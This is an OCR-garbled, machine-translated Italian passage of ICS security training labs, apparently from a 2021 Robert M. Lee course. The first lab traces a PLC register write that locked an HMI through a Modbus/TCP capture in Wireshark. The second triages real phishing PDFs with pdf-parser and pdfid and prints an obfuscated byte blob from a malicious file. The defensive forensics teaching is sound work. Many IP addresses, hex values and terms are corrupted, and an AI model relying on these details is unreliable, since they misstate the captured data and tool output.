*Nota* 192.168.0.8 è l'HMI e 192.168.0.10 è il PLC Click. Stiamo cercando il registro 50 sul Click PLC per determinare se possiamo vedere i comandi scritti per convalidare la logica. Il registro 50, per DS51, si tradurrebbe in 32 in HEX.

*Nota* Ora dobbiamo capire cosa sta succedendo nelle transazioni ModbusTCP; se analizzassimo ogni pacchetto ci vorrebbe troppo tempo. Ma possiamo determinare quali codici funzione vengono utilizzati e vedere cosa potrebbe essere utile (scrive e legge come esempio). Poiché sospettiamo che sia il PLC a scrivere sull'HMI e non il contrario, cercheremo l'HMI che invia un comando di lettura al PLC. La risposta avrebbe il valore di scrittura, in modo inappropriato, sull'HMI.

> Identificare i vari codici funzione focalizzati sulla lettura
> Una rapida revisione della sezione "Informazioni" in Wireshark mostrerà un paio di tipi diversi di codici funzione di lettura
> Campiona la query e le risposte per determinare quale codice funzione ha maggiori probabilità di essere utile
 75 Risposta: Trans: 25021; Unità: 1, Funz 66 Interrogazione: Trans: 25022; Unità: 1, Funes 127 Risposta: Trans: 25022; Unità 2.) Fane: 66 Query: Trans: 25023; Unità: 1, Funz: Leggi Holding Registers 127 Risposta: Trans: 25023; Unità: 1, Funz.: ing Kegisters 131 Query: Trans: 25024; Unità: 1, Funz: 16: Scrivi più registri 66 Risposta: Trans: 25024; Unità: 1, Funz: 16: Scrivi più registri 66 Query: Trans: 25025; Unità: 1, Funz: Lettura ingressi discreti
 75 Risposta: Trans: 25025; Unità: 1, Funz: Lettura ingressi discreti
 66 Domanda: Trans: 25426; Unità: 1, Funz: Lettura registri di ingresso
 127 Risposta: Trans: 25026; Unità: 1, Funz: Lettura registri di ingresso
 66 Domanda: Trans: 25427; Unità: i, Funes legge i registri delle aziende
 Leggi ingressi discreti
 Leggi i registri di input Leggi i registri di Tnput
 WwW & &N
 ww b fw Ny
 127 Risposta: Trans: 25027; Unità: 1, Funz: Lettura registri di mantenimento

*Nota* Ad esempio, Leggi ingressi discreti è Codice funzione 2, Leggi registri di mantenimento è Codice funzione 3 e Leggi registri di ingresso è Codice funzione 4. Potresti campionare ciascuno di questi per provare a determinare i valori che potrebbero interessarci. Ad esempio, sappiamo che stiamo cercando valori relativi a DS51 che sarebbero il registro 50. Per determinare quale codice funzione ha valore, dovresti guardare la query e la risposta.

© 2021, Robert M. Lee Lab 4.2-8
 DDD Om®
 eo @® B® w®

? PRnoonnenoennn nen Ss) oe oP ob oO oO Ob bb eb be be w&
 ee 8 e oY
 COME
 Qs'
 a5

*Nota* Il codice funzione 2, ad esempio, ha una query e, nella sua risposta, ha vari valori di bit, probabilmente non utili in questo caso.
 Informazioni sulla lunghezza del protocollo di origine
 192.168.8.9 -168.0.16 Modbus/T.. 66 Interrogazione: 25021; Unità: : 2: Lettura ingressi discreti
-107108 192.168.0.10 -168.0.9 Modbus/T.. 75 Risposta: + 250213 Unità: + 2: Lettura ingressi discreti
-1073@1 192.168.0.9 +168.0.10 Modbus/T... 66 Interrogazione: : 25@22; Unità: 1, Funz: 4: Lettura registri di ingresso 192.168.8.16 ~168.0.9 Modbus/T.. 127 Risposta: + 25022; Unità: 1, Fune: + Leggi registri di ingresso 192.168.8.9 +168.0.18 Modbus/T.. 66 Query: : 25823; Unità: 1, Funz: 3: Lettura registri Holding 192.168.6.18 .168.6.9 Modbus /T.. 127 Resoonse: : 25023: Unità: 1. Funz: : Lettura registri Holding
 Lunghezza: 15 Identificatore unità: 1 Modbus 988 010 = Codice funzione: Lettura ingressi discreti (2)
[Richiedi frame: 2]
[Tempo dalla richiesta: ©.003476000 secondi] Conteggio byte: 12
> Bita:@

*Nota* Il codice funzione 3 interroga i dati dai registri nella risposta alla query, quindi è promettente ma arriva solo fino al registro 31 nei pacchetti che stiamo esaminando. Quindi potrebbe essere utile per la nostra domanda, ma si tratta di Holding Registers e non di Input Registers, è ragionevole sospettare che le modifiche di valore sarebbero negli Input Registers, ma potremmo tornare su questo se non abbiamo un'opzione migliore (noi avrà un'opzione migliore).
 3 61:53:05, 110462 T52,168.0.5 152,168.0.10 _Nodbus/T~ 3: Lettura registri Holding 192.168.9.10 192.168.0.9 Modbus/T.. 3: Lettura registro Holding Reeisters 29 (UINTI6 ~ Numero registro: 29 Valore registro (UINTI6): 0 Y Registro 30 (UINTI6): @ Numero registro: 30 Valore registro (UINTI6): @ Y Registro 31 (UINTI6): @ Numero registro: 31 Valore registro (UINTI6): @

*Nota* Il codice funzione 4 esegue query dai registri nella risposta e arriva fino al registro 31 nel pacchetto che stiamo esaminando. Tuttavia, vogliamo davvero il registro 50, quindi dobbiamo vedere se ci sono altri valori oltre a quelli che vanno al registro 31. Qualsiasi campionamento dei valori del codice funzione 4 mostrerebbe che Query fornisce un numero di riferimento per il registro che desidera. 0 li darà tutti e qualsiasi altro numero darà quello esatto.

@: Leggi input Registers ead Input Registers 1, Func: 1: Leggi Coils 1, Func: 1: Leggi Coils
 1918 @1:53:21.420581 192.168.0.8 192.168.0.9 Modbus/T.. 66 Interrogazione: 253:21.421322 192.168.0.9 192.168.0.8 Modbus/T... 65 Risposta: 435526 192.168.0.8 19 2.168.0.16Modbus/T. 66 Query: Trans: 351; 1921 @1:53:21.439289 192.168.2.10 192.168.2.8 Modbus/T.. 78 Risposta: Trans: 351; Checksum: @x8188 [non verificato]
[Stato checksum: non verificato] Puntatore urgente: 0
[Analisi SEQ/ACK]
[Timestamp] Payload TCP (12 byte)
[Dimensione PDU: 12] Identificatore transazione Modbus/TCP: 43 Identificatore protocollo: @ Lunghezza: 6 Identificatore unità: 1 Modbus
+8 100 = Codice funzione: Lettura registri di ingresso (4) Numero di riferimento: Conteggio 1 parole: 1

© 2021, Robert M. Lee Lab 4.2-9
> [Timestamp] Payload TCP (11 byte)
[Dimensione POU: 11] Identificatore transazione Modbus/TCP: 43 Identificatore protocollo: @ Lunghezza: 5 Identificatore unità: 1 Modbus
-@8@ @10@ = Codice funzione: Lettura registri di ingresso (4)
[Rea Cornice: 1918
[Tempo dalla richiesta: @.000741@0@ secondi] Conteggio byte: 2 Y Registro 1 (UINTI6): 100 Numero registro: 1 Valore registro (UINT16): 100
 65 Risposta:
 1919 421322 192.168.0.9 192.168.8.8 Modbus/T.. Trans?
* 192.168.0.8 192.168.9.18 Modbus/T... 66 Interrogazione: Trans: 192.168.0.10 192.168.0.8 Modbus/T. 78 Risposta: Trans:
 435 Unità: 351; Unità: 351; Unità:
 a, Funz: 1, Funz: 1, Funz:
 4: Leggi registri di ingresso 1: Leggi bobine 1: Leggi bobine

*Nota* Pertanto stiamo cercando una query che abbia un numero di riferimento pari a 50 per il registro 50 che è il valore decimale per DS51.Una rapida revisione dei valori HEX ci dirà esattamente cosa cercare (sostituendo il file
 valore con il valore per 50):
 ModBus
 Numero di riferimento: 1 Conteggio parole: 1
 feb
 UN

-8@@ @1@@ = Codice funzione: Lettura registri di ingresso (4)

@@ 34 aa 53 46 G8 5@ 66 9020 @@ @9 cc fc O1 F6 38 2a 0830 28 13 81 88 88 68 @@ 2b oese (ERY

@@ @c 29 Be af bl O@ @c 29 18 b5 Bf G8 GB 45 OO 66 66 c@ ad 68 O38 cO ad Of 3c a7 2 F7 7@ 5@ 18 66 86 8 6 61

*Nota* Nel pacchetto di query per il codice funzione 4 vedremo che l'identificatore unito è 1 e il codice funzione è 4
 per un valore HEX di 0x0104.

*Risposta* È molto probabile che il codice funzione 4 sia la query utile e il suo identificatore HEX è 0x010400. Il valore per il numero di riferimento 50 sarebbe 0x32 in HEX. Pertanto, stiamo cercando 0x01040032.
 4. Qual è il primo pacchetto in cui avviene la scrittura in questa sessione e a che ora?

> Cerca 0x01040032 nell'acquisizione dei pacchetti
> In Wireshark scegli Modifica > Trova pacchetto

> Inserisci 01040032 nel campo e fai clic su Trova

> Cerca valori diversi nel registro 50

© 2021, Robert M. Lee
 Pacchetto 6552 11/07/2021 alle 05:54:00 UTC
 Laboratorio 4.2-10
 RPRmomnmnemnmenemnmeeoewe*ee*oem*nenen#eeoensee*e® ® ® ® © ® ab vn ty “5

@ hmilocked.pcap File Modifica Visualizza Vai Acquisisci Analizza statistiche
 4 Copia » Wid e trova pacchetto... Ctrl+F ind Avanti Ctrl+N
 Trova Ctri+B precedente
 Seleziona/Deseleziona pacchetto Ctrl+M Seleziona tutto visualizzato Ctrl+Maiusc+M
 eS)
 ouoao0s2
 Lunghezza Info us T= 127 Risposta: Trans: 25659; Unità: 1, Funz: 3: Lettura registri di mantenimento
 5078 @1: 248758 192.168.8.8 192.168.¢.10 Modbus /T.. 66{ Richiesta: Trans: 378; Uni: Leggi i registri di input | 5079 01:53: 249344 192.168.@.10 192.168.0.8 Modbus/T... 65 Risposta: Trans: 378; Unità 1, Funz: 4: Lettura registri di ingresso 5082 @1:53:48.309661 192.168.@.9 192.168.6.18 Modbus/T.. 66 Query: Trans: 26537; Unità: 1, Funz: 2: Lettura ingressi discreti
 5983 01:53:48.313269 192.168.@.10 192.168.2.9 Nodbus/T... 75 Risposta: Trans: 26537; Unità: 1, Funz: 2: Lettura ingressi discreti 5@85 01:53:48.313665 192.168.@.9 192.168.@.18 Modbus/T... 66 Query: Trans: 26538; Unità: 1, Funz: 4: Lettura registri di ingresso
 Identificatore dell'unità: 1 Y Modbus
+80 @100 = Codice funzione: Lettura registri di ingresso (4) Numero di riferimento: 58 Conteggio parole: 1
 06 do 7c 1a 17 43 00 Oc 29 18 bS BF 08 G8 4500 --|--C-- ) E
 00 34 €2 bb 49 08 52.06 00 Oe co as eB Os co as «4B 0@ @a cd 94 01 £6 bd 25 ea SF dB c9 cB 17 50 18 , en 0036 fe 1c 81 89 02 09 @1 7a 6 G0 90 26 O1 HE ee 32 zee Bo 42 8 @1 *

*Nota* Ora che abbiamo la query giusta dobbiamo scegliere una risposta e vedere i valori.
 5079 @1:53:48.249344 192.168.0.10 192.168.8.8 Modbus/T. 65 Risposta: Trans: 378; Unità: 1, Funz: 4: Leggi i registri di ingresso 5@82 01:53:48. 30966 192.168.0.9 192.168.0.1@ Modbus/T.. 66 Interrogazione: Trans: 26537; Unità: 1, Funz: 2: Lettura ingressi discreti 48313269 192.168.@.18 192.168.0.9 Modbus/T.. 75 Risposta: Trans: 26537; Unità: 1, Funz: 2: Lettura ingressi discreti 313665 192.168.8.18 Modbus/T.. 66 Query: Trans: 26538; Unità: 1, Funz: 4: Lettura registri di ingresso

[Tempo dalla richiesta: 0,004586000 secondi] Conteggio byte: 2
© Registro S@ (UINTI6): @ Numero registro: 58 Valore registro (UINTI6): @ 908 00 @c 29 18 bS Bf 22 de 7c 1a 17 43 88 08 45 00 02 33 cf c9 08 0 42 06 29 99 c@ af 00 Ga cd a8
@@ 08 @1 £6 cd 94 d3 c9 cB 17 bd 25 ea Gb 50 18 82 6c OF 72 G0 02 01 7a G0 20 00 05 01 04 02 20 ee

*Nota* Come sospettavamo, ci ha dato il registro 50. Vediamo che il valore del registro è uno 0. Questo è appropriato e ciò che dovrebbe accadere, ma sappiamo dalla manipolazione logica che si verifica un 1 per bloccare l'HMI. Vediamo che il valore HEX per la risposta del registro 50 con valore del registro pari a 0 è 0x0104020000. Pertanto dovremmo aspettarci di vedere 0x0104020001 per una risposta 01 scrivendo così dal PLC all'HMI.

> Cerca 0x0104020001 per verificare che esista e scoprire a che ora si verifica
> In Wireshark scegli Modifica > Trova pacchetto

© 2021, Robert M. Lee Lab 4.2-11
> Inserisci 0104020001nel campo e fai clic su Trova
> Analizzare i pacchetti
 col Informazioni sulla lunghezza
 noi/T. 131 Domanda: Trans: 26968; Unità: 1, Funz: 16: Scrivi più registri us /T 66 Risposta: Trans: 26968; Unità: 1, Funz: 16: Scrittura di più registri
 Domanda: Trans) 373: nits 1 euines
 1. Leggi le bobine

*Nota* Dopo aver premuto Trova vediamo che il pacchetto esiste, continua a fare clic su Trova per tornare al primo caso in cui ciò si verifica.
 6552 61:54:00.669530 6553 @1:54:00. 703885 6554 01:54:00. 705505 6556 @1:54:0@. 705781 6557 @1:54:8, 708419 6559 @1:54:08. 708578 6561 @1:54:00.710438 6563 @1:54:0@.710798 6564 @1:54:@@.713521

~ [Richiedi frame: 6551]
 Conteggio byte: 2 Y Registro 5@ (UINTI6): 1 Numero registro: 5@

@000 @@ Oc 29 18 b5 Bf ee de 28 33 di cl @@ 88 40 06
@@ @8 G1 #6 cd 94 dB c9
@2 6c G1 2e 28 CO G1 7a

[Tempo dalla richiesta: @.904966000 secondi]
 Valore del registro (UINTI6): 1
 192.168.9.18Modbus/T. 192.168.0.9 Modbus/T.. 192.168.8.18 Modbus /T.. 192.168.0.9 Modbus/T.. 192.168.0.10 Modbus/T. 192.168.0.9 Modbus/T.. 192.168.0.18 Modbus/T.. 192.168.0.9 Modbus/T... 192.168..10 Modbus/T..Fe 1s 17 43 08 08 45 20 yovees [eee -E* ~ 27 al cO a8 08 Ga cOaB 3B 42 8b bd 25 ed 3b 50 18 %5P
 08 @@ 00 05 61040208 Lez
 65 Risposta: 66 © Domanda: 75 Risposta: 66 Domanda: 127 Risposta: 66 Domanda: 127 Risposta: 131 Quer; 66 Risposta:
 378;

: 26973; 226973; 126974; 226974;
: 26975;
: 269753
: 26976;
: 26976;
 unità: Unità: unità: Unità: unità: unità: Unità: unità: Unità:

-
 Bawwrann

: Leggi i registri di input

: Leggi i registri di input

: Leggi i registri delle aziende

: Leggi i registri delle aziende

: Scrivi più registri
+ Scrivi più registri)

+ Leggi i registri di input |
 Lettura ingressi discreti Lettura ingressi discreti

*Nota* Vediamo che la prima istanza del valore di registro pari a 1 è nel pacchetto 6552. Puoi andare in Modifica > Preferenze e modificare la visualizzazione dell'ora se desideri ottenere un orario più riconoscibile.

@Wireshark. Preferenze

-
 X
 v Aspetto — ' - _ - _ ; Colonne visualizzate Tipo titolo Campi Occorrenza campo
| Carattere e colori) | N. Disposizione numero | | Data e ora UTC, nel formato AAAA-MM-GG, e ora di acquisizione | Sorgente iM Indirizzo sorgente Expert M4 Destinazione Indirizzo di destinazione Pulsanti filtro 4 Protocollo di protezione Nome Risoluzione 4 Lunghezza Lunghezza pacchetto (byte) | Protocolli ja Info Informazioni Chiavi RSA L_> Statistiche |

© 2021, Robert M. Lee
 Laboratorio 4.2-12
 a ® B® ® fO Of ww ®

@® @® @ ®

)
 se» ® ® .

® a7wa

/-
 Le’ is’ ca’ a a a a ie
 iB

“5!
 6552 2021-@7-11 @5:54:00.669530 192.168.0.10

| 6553 2021-07-11 @5:54:00.703085 192.168.0.9
| 6554 2021-07-11 @5:54:00.7055@5 192.168.0.10
| 6556 2021-07-11 @5:54:@0.705781 192.168.@.9
| 6557 2021-07-11 @5:54:00.708419 192.168.0.10
| 6559 2021-07-11 @5:54:00.708578 192.168.0.9
| 6561 2021-07-11 @5:54:00.710438 192.168.0.10
: 6563 2021-07-11 @5:54:00.710799 192.168.0.9
' 0.713521 192.168.0.10
 6564 2621-07-11 @5:54:
 PS oe hae a ea eco es eae |
-@@@ @10@ = Codice funzione: Lettura registri di ingresso (4) Frame di richiesta: 6551
[Tempo dalla richiesta: @.2040660@8 secondi]
 Conteggio byte: 2 Y Registro 5@ (UINT16): 1 Numero registro: 5@ Valore registro (UINT16): 1

*Risposta* Il primo pacchetto era 6552 e si è verificato il 2021-07-11 alle 05:54:00 UTC.
 Esercizi da asporto
 Questi due laboratori hanno evidenziato i seguenti punti chiave:
 I PLC possono essere manipolati attraverso la loro logica per causare confusione tra gli stati logici e fisici; gli operatori possono capirlo ma non aspettarselo come risultato di un attacco informatico
 La logica PLC è un bersaglio maturo di un compromesso in stile bomba logica che porta a una logica specifica che si realizza nelle giuste condizioni o nel momento giusto
 e Alcuni sistemi HMI possono essere gestiti dai livelli inferiori e si tratta di un vettore insolito di attacco ma efficace in quanto verrebbe probabilmente considerato un problema di manutenzione
 e Il ripristino della logica "nota come valida" del PLC non sempre riscrive i dati corrotti a seconda di dove i dati vengono archiviati nel sistema e se si trovano nella memoria volatile o non volatile
 e Analisi del traffico di rete con la comprensione del sistema I.C.S. I valori del protocollo possono essere un'ottima fonte di dati forensi per l'analisi delle cause profonde, indipendentemente dal fatto che il problema sia o meno un attacco informatico

© 2021, Robert M. Lee Lab 4.2 - 13 wy wy
 Ww
 ww wo ww ww Ww
 Ww
 ww wy ww WwW
 Lab 4.3 - Analisi delle email di phishing
 e —_ Familiarizzazione con buoni PDF. e Identificazione di PDF potenzialmente dannosi.

*Informazioni sullo scenario* Questo laboratorio nel tema dello scenario cercherebbe di vedere come si è verificato l'incidente alla raffineria di Calistoga, ma stiamo utilizzando vere e-mail di phishing in modo che tu possa avere esperienza con esse e questo laboratorio è disconnesso dallo scenario.
 Preparazione agli esercizi
 Questo esercizio utilizzerà il RELI.C.S. VM. Dovrai copiare i PDF nel RELI.C.S. VM dall'ISO del tuo corso dal file I.C.S.515_PDFs_Lab3_3_Analyzing_Phishing_Emails.zip. Puoi svolgere il laboratorio ovunque nell'area RELI.C.S. VM ma per far corrispondere gli screenshot al laboratorio creare una cartella aggiuntiva nella cartella ics515 sul RELI.C.S. VM Desktop ed estrai i PDF in quella cartella. I PDF sono in uno zip protetto da password. La password è I.C.S.515ATTENZIONE#
 Non estrarre i PDF all'esterno della VM poiché sono dannosi.
 Domande
 Cosa si è rivelato probabilmente dannoso in water_update_part2.pdf?
 Il PDF sulla revisione della postura nucleare sembrava dannoso a prima vista? Quale oggetto n. sembrava più sospetto nel PDF della conferenza?
 Quante volte sono stati utilizzati /Encrypt e /JavaScript nel PDF della conferenza?
 PeNP

© 2021, Robert M. Lee Lab 4.3-1 Compito — Familiarizzazione con buoni PDF:

*Nota* Comprendere la struttura completa di un PDF e le varie versioni non rientra nell'ambito di questo corso. Tuttavia, questa parte del laboratorio ti consentirà di familiarizzare con alcuni buoni PDF e i dati in essi contenuti.

> Inizia il tuo RELI.C.S. VM.

> Accedi alla VM:
> ACCEDI =reliquie
> PASSWORD = reliquie

> Navigare nella cartella con i PDF:
> Apri un terminale.
> Eseguire il seguente comando nel terminale: cad /home/relics/Desktop/ics515/extra

*Nota* PDF-parser.py verrà prima utilizzato per analizzare PDF1 per determinare tutte le informazioni inserite nel PDF, come gli oggetti.Invece di leggere le informazioni nel terminale di comando, verranno inviate (usando il comando “>”) in un file di testo per essere lette più facilmente.

> Analizza PDF1 con pdf-parser.py.

> Nel prompt dei comandi, inserisci: pdf-parser.py PDFl.pdf > parserl.txt
 fl Ter
 pdf-parser.py PDFi.pdf > parseri.txt

> Apri parser1.txt nell'editor di testo:
> Passare a ics515 > Cartella extra dalla GUI del desktop.
> Fare clic con il pulsante destro del mouse su parser1.txt e selezionare Apri con editor di testo.
> Leggi parser1.txt.

*Nota* Notare il modello generale degli Oggetti (obj) e le informazioni che contengono. Informazioni come i caratteri occupano buona parte del documento. Quando ti chiedi cosa significhi un comando, come /FlateDecode, puoi rapidamente cercare su Google le informazioni per determinare la funzione. In questo caso, FlateDecode agisce come un algoritmo di compressione per condensare le informazioni (utile sia agli aggressori che ai difensori). Da questo tipo di analisi possono essere rivelate informazioni interessanti, ad esempio come appare la struttura generale del documento, o chi è l'Autore e quando è stata la data di Creazione.

© 2021, Robert M. Lee Lab 4.3-2

>

™, va
 come 4s 3
 aa
 1372 Riferimenti: 1373
 1374 <<
 1375 © /Autore
 1376 {Creatore '(p9\xOOM\x0e1\x00c\xOe@r\xOG0\x0Os\x080\xOOf\xO8t\xAGa\x08 \xOOW\xOG0\xOOr\xGOd\x0@ \x002\xe00\x001\x000) ' 1377 /DataCreazione "(0:20150123112257-06'60')"
 1378 /ModDate "(D:20156123112257-06'00')"
 1379 {Produttore '(b9\xO@M\x0Ot\x80c\xGOr\x8G0\x00s\x000\xOOf\xO6t\xd08\x00 \xGOW\x600\x00r\xO0d\xG0 \x002\x000\x001\x000)' 1380 >>
 1381
 1382

*Nota* Essere in grado di ispezionare manualmente un documento PDF è utile ma per riferimenti più rapidi è possibile utilizzare lo strumento pdfid.

> Utilizza pdfid per analizzare PDF1.pdf.
> Nel prompt dei comandi, inserisci: pdfid.py PDF1l.pdf

$ pdfid.py PDF1.pdf PDFiD 0.2.7 PDF1.pdf Intestazione PDF: %PDF-1.5 obj
 endobj
 flusso
 endstream
 xrif
 trailer
 startxrif

{Pagina

/Crittografa

/Obiettivo

{3 secondi

/JavaScript

/AA

/OpenAzione
/AcroForm
/IBIG2Decodifica
/RichMedia

/Lancio
/File incorporato

/XFA

/URI

{Colori > 2%24
 oh
 paga
 D>NN NM PR

*Nota* pdfid cerca determinate parole chiave e informazioni per fornire un conteggio delle informazioni all'utente. Questo documento ha 94 oggetti, non utilizza JavaScript, non ha crittografia e non ha EmbeddedfFiles. È difficile determinare un file valido o difettoso semplicemente guardandolo, ma comprendere la struttura di un PDF e il tipo di informazioni utilizzate in modo improprio può essere utile per identificare documenti potenzialmente dannosi per ulteriori analisi. Dedica qualche minuto e ripeti i passaggi da 4 a 7 su PDF 5 e PDF 6 per notare le differenze nei diversi tipi di PDF.

© 2021, Robert M. Lee Lab 4.3-3 Attività: Identificazione di PDF potenzialmente dannosi j
 1. Cosa si è rivelato probabilmente dannoso in water_update_part2.pdf? Più %EOF e Javascript

> Analizza water_update_part2.pdf con pdf-parser.py.
> Nel prompt dei comandi, inserisci: pdf-parser.py water_update_part2 .pdf > parser-water.txt

§ pdf-parser.py water_update_part2.pdf > parser-water.txt

> Apri parser-water.txt con l'editor di testo:
> Leggi il file e nota le differenze rispetto a PDF1, PDFS e PDF6.
> Cerca oggetti anomali.[183 Commento PDF '%%EOF\n'
 184
 185 Commento PDF '%\ xab\xa7n\xde\xdd\xdd\xa1\xe5&\xa9%\xab\xa7j\xdc\xdd\xdd\xa1\xe5&\xa9%\ xab\
\xab\xa7\xie\xde\xdd\xdd\xa1 \xe58 \xab\x9f \x1a\xde\xdd\xdd3\xa2"""\xaf\xafr\xde\xdd\xddsh"
\xaig\x9e&\xc9\xcbH"H" \xa9\xa7\x1e\xdc\xdd\xddr\xa90\x9es \xddw\ xfa\xaf\xb7\x06\xdd\ xdd\xd H"H 3""" \ xe2\xaf\xaf\x06\xdd\ xdd\xdds \ xddw\xfe\xabg\xe6\xe5\xa7\x16\xdc\xdd\xdd""""\xa9\x)
\xai\xai"""H" \xafo\x96s2"&"" \xaf\ xb7\x16\xd8\ xdd\ xddp\ xa9g\x9er \xddw\xc2\xe5g\x8a""""\xc9
\x9e\xa67\x16\xd8\xdd | xdd\x11g\x86\xa90\xBa\xaa\xa6/\x16\xdB\xdd \xdd\ xaow\x86\ xa \xc8#\xa
\xa6\xab"""H"\xafo\x96s\xa9\xb7\x16\xdc\xdd\ xdd\ xe3\xco(\xa9\xa7j\xdc\xdd\xdd\t\xeOr \xaf\
\xa9q\x8a\xal\xe2#\xabg\x8a\xa9\xaf\x16\xde\xdd\ xdd\xe3\xc3(\xa9\xb7j\xdc\xdd\ xdd\ t\xF3\x
\x9c\xae\ '\x16\xdB\xdd\xdd\x110\x86\ xa9w\ xBa\ xaa\ xae7 \x16\xd8\xdd\xdd\ xa9g\x86\xa1\xca#\x
\xa7j\xde\xdd\xddr \xa90\x9es\xddw\xfaH"J\xa2"""H H"H 3"""'\xe2\ xaf\xb7\x06\xdd\ xdd\ xddp\ xddw\xfe\ xabg\xe2\xe5\xa7\x16\xde\xdd\xdd""""\xa9\xa7F\
\xa90\x8a\xa1\xe3#\xabo\x8a\xa3_\x8a"&""Q8\xa9w\xBa -
\x9c\xa67\x16\xdB\xdd\xdd\ xa \xd2U\ xa9o\xBa\xaa\xa6//\x16\xd8\xdd\xdd\xc9\xf 6H" \xafw\x92p\
\xa6\xa2"""H"\xafg\x96r\xa9\xaf \x16\xdc\xdd \ xdd\ xe3\xc3 (\xa9\xb7F\xde\ xdd\ xdd\ t\xf3p\xaf\
\xa9w\xBa\xa1\xeo#\ xabw\ xBa\xa9\xa7\x16\xde\xdd\ xdd\xe3\xc2(\xa9\xaff\xdc\xdd\xdd\t\xea\x
\x9c\xa67\x16\xdB\xdd\xdd\xa1\xd2U\xa9o\xBa\xaa\xa6 /\x16\xd8\xdd\xdd\xc9\xe5H" \xafw\x92p\
\x02e\xe4%\x00\ xaf\x97\x06\xdd\ xdd\xddled\ xa8<\xaa=\xa2\x1c"W\xd7\xe4%-
\x00e\xe4%" \xaf\xaf \xf2\xdc | xdd\ xdds | xaf\xb7\xc2\xdc | xdd\\xddpH"H"H"H"H"H" \xaf\xa7r\xde\xd
\xdit\xa9T\x02! \xd1\x11\xebqkc\x8fy! \xe1q\x11\xf9-\x9c2\x18\ xf4v*\xe3\xe9%! \xF8b\xc9\xd3\
\xeOu\xaf\x9F\xee\xdd\xdd\ xdd\xa9o\xea\xal\xe5&\xcO\xd9\ x89} \xa1\xe58\xa9\xF8| -
{\xddg\xea\xei\xca{\xd9\xdd\ xdd\xcf\x8d\xdd\x96\xac1(\x8ea\x9c\x8e\xF9\xb1\x10\ xc6\xb6\ x9
 186
 187xrif
 188
 rimorchio 189
 199 <<
 191 {Taglia 16 192 /Radice 1 O 193 >>
 194|
 195 startxrif 32021 196
 197 Commento PDF '%%EOF\n' 198
 199 Commento PDF '%S#"! \x1f\xte\x1d\xic\x1b\x1a\x196csm*\x13\x12\x11\xd2\x00\xde\r'
 Aaa

© 2021, Robert M. Lee Lab 4.3-4

( ( ee ( ee, ee
 eh
 iad
 eh
 cadavere
 7?
 co

>
«ed
 Ww
 Ww
 w
 Ww
 sì
 ip
 Bs'
 È
 e.a

*Nota* In parser-water.txt, noterai che la struttura è significativamente diversa da PDF1, PDF5 e PDF6. Nello specifico, ci sono numerosi commenti PDF. Questa è un'area in cui è possibile inserire il codice da eseguire dopo l'esecuzione del documento. Ciò che rende questo file particolarmente interessante sono le numerose note %EOF. Una rapida ricerca su Google mostrerà che %EOF sta per End of File e viene utilizzato per denotare la fine del PDF. PDF1, PDF5 e PDF6 avevano tutti un solo %EOF. Eppure ci sono numerosi %EOF in questo file. Questa è una bandiera rossa. Inoltre non ci sono informazioni sull'autore. Niente rende immediatamente dannoso un PDF, ma questi tipi di segnali d'allarme dovrebbero indicare all'analista che è necessaria un'analisi successiva, come l'esecuzione del file attraverso un sandbox automatizzato di analisi del malware (di cui parleremo più avanti oggi).

> Utilizza pdfid per analizzare water_update_part2.pdf.
> Nel prompt dei comandi, digitare il comando: Pdfid.py water _update_part2.pdf

*Nota* Ancora una volta, nota la differenza tra PDF1, PDF5 e PDF6. Ci sono più oggetti finali e flussi finali che oggetti e flussi iniziali, viene utilizzato JavaScript e ci sono EmbeddedFiles. Nessuno di questi casi di per sé è dannoso, ma solleva preoccupazione. JavaScript, ad esempio, viene comunemente utilizzato nei PDF da malware per eseguire codice sul sistema o per raggiungere un server Web per scaricare un exploit o aprire l'accesso a un avversario. Quando si alzano abbastanza segnali d'allarme, fidati del tuo istinto.
 S$ pdfid.py water_update_part2.pdf PDFiD 0.2.7 water_update_part2.pdf Intestazione PDF: %PDF-1.5 obj
 endobj
 flusso
 endstream
 xrif
 trailer
 startxrif

/Pagina

/Crittografa

/Obiettivo

/3s

{JavaScript

/AA

/OpenAzione
/AcroForm
/IBIG2Decodifica
/RichMedia

/Lancio
/File incorporato

/XFA

/URI

/Colori > 2424

*Nota* Anche l'utilizzo di JavaScript è potenzialmente dannoso e preoccupante poiché non dovremmo vederlo in questi tipi di PDF.

© 2021, Robert M. Lee Lab 4.3-5
*Risposta* L'uso multiplo di %EOF e Javascript
 2. Il PDF sulla revisione della postura nucleare sembrava dannoso a prima vista? NO

> Analizza il documento di ricerca sulla revisione della postura nucleare 2010.pdf con pdf-parser.py.
> Nel prompt dei comandi, inserisci:
 pdf-parser.py Ricerca\ Documento\ sul\ Nucleare\ Postura\ Revisione\
 2010.PDF > nucleare.txt
 eal Terminal
 S$ pdf-parser.py Ricerca\ Documento\ sul\ Nucleare\ Postura\ Recensione\ 2010.PDF > nuclear.txt
 1 Questo programma non è stato testato con questa versione di Python (3.8.5)
 2 In caso di problemi, utilizzare Python versione 3.7.5 3 Commento PDF '%PDF-1.6\n'
 4
 50bj 10
 6 Digitare: /FileIncorporato
 7 Riferimenti:
 8 Contiene il flusso

-]
 10 <<
 41 /Filtro /FlateDecode 12 /Lunghezza 2060
 13 /Tipo /FileIncorporato 14 >>
 È
 16
 17 oggetto 2 0
 18 Tipo:
 19 Riferimenti: 3 OR
 20
 21 <«
 22 VQ
 23 /Bambini [3 © R] 24 /T (topmostSubform[0])
 25 >>
 26
 27
 28 oggetto 3 0
 29 Tipo:
 30 Riferimenti: 20R, 40R 31
 32 <<
 33 /Genitore 20R 34 /Bambini [4 0 R] 35 /T (Pagina1[0]) 36 >>

© 2021, Robert M. Lee
 Laboratorio 4.3-6
 Rif]
 FM

>

=
 2

>Te
 as 45 45 eo iB a5 \s 4B py ae a
 45

*Risposta* No, il file non sembra dannoso al primo passaggio. Mentre alcuni PDF saranno ovviamente dannosi, altri sono realizzati in modo più esperto e non presentano segni evidenti di essere dannosi senza l’analisi con strumenti speciali. In questo caso, probabilmente vorrai eseguire questo PDF in una Sandbox per determinare se era dannoso.
 3. Quale oggetto n. sembrava più sospetto nel PDF della conferenza?? Oggetto 388

> Analizza le informazioni sulla conferenza_Conferenza IFANS 2010 sugli affari globali (1001).pdf con pdf-parser. pi.
> Nel prompt dei comandi, inserisci: pdf-parser.py Conference\ Information 2010\ IFANS\ Conference\ on\ Global\ Affairs\ \(1001\).pdf > global.txt
 74 oggetto 388 6 75 Tipo: 76 Riferimenti:
 7 <<
 79 /Lunghezza 128
 80 /Filtro /Standard
 81 /0 "(\x80ZKip\x9bg\xOb-0} 6\xOe\x8a\xO5v6. \x18\x9F *6q\x95; \x9a\x991A\xO3C)'
 82/P-3392
 83 {R3
